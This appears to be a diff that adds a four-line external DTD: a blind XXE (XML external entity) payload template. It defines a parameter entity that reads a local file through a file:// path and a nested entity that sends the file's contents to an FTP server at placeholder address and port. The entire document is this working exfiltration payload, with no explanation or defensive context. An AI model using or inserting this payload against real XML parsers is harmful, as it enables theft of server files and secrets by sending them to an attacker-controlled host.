@@ -1,0 +1,4 @@
+<!ENTITY % file SYSTEM "file:///<file_path>">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'ftp://<ip>:<ftp_port>/%file;'>">
+%eval;
+%exfil;
